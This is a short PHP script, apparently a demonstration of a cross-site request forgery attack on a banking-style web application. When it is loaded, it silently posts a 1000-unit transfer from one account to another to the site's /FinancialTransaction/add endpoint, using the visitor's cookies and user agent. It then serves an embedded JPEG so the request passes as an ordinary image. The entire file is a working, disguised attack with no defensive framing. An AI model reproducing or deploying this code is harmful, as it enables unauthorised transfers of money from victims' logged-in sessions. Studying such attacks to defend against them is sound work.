<?php
$idSender = 7; // Compte à Louis
$idRecipient = 13; // Compte à Edith
$amount = 1000;

$protocol = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || $_SERVER['SERVER_PORT'] == 443) ? 'https' : 'http';

$ch = curl_init();
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_URL, "{$protocol}://{$_SERVER['HTTP_HOST']}/FinancialTransaction/add");
curl_setopt($ch, CURLOPT_POSTFIELDS, "idSender={$idSender}&idRecipient={$idRecipient}&amount={$amount}");
curl_setopt($ch, CURLOPT_COOKIE, http_build_query($_COOKIE, '', '; '));
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_exec($ch);
curl_close($ch);

header('Content-Type: image/jpeg');
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');

$imgBase64 = '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';

$imgBin = base64_decode($imgBase64);
$image = imagecreatefromstring($imgBin);
imagejpeg($image);
imagedestroy($image);
